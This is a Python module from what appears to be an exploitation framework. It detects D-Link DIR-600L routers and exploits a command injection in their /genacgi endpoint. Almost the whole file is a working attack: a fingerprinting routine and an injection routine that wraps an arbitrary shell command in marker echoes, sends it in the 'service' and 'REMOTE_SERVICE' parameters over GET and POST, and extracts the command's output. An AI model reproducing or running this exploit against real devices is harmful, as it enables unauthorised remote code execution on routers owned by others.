#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DIR-600L genacgi helpers."""

from __future__ import annotations

from typing import Optional

from core.framework.base_module import BaseModule

MARKER = "LLC4RGE"


class Dlink_dir600l(BaseModule):
    """genacgi_main command injection."""

    def dir600l_detected(self) -> bool:
        for path in ("/", "/index.html", "/genacgi"):
            resp = self.http_request("GET", path, timeout=12)
            if not resp:
                continue
            body = (resp.text or "").lower()
            if "dir-600l" in body or "d-link" in body or "genacgi" in body:
                return True
        return False

    def dir600l_inject(self, cmd: str) -> Optional[dict]:
        safe = (cmd or "id").replace(";", " ")
        payload = f";echo {MARKER};{safe};echo {MARKER};"
        attempts = (
            ("GET", "/genacgi", {"REMOTE_SERVICE": payload, "service": payload}, None),
            ("POST", "/genacgi", None, {"service": payload}),
        )
        for method, path, params, data in attempts:
            kwargs = {"timeout": 20}
            if params:
                kwargs["params"] = params
            if data:
                kwargs["data"] = data
            resp = self.http_request(method, path, **kwargs)
            if not resp:
                continue
            text = resp.text or ""
            if text.count(MARKER) >= 2:
                out = text.split(MARKER)[1].strip()
                return {
                    "method": method,
                    "path": path,
                    "output": out,
                    "status_code": int(resp.status_code or 0),
                }
        return None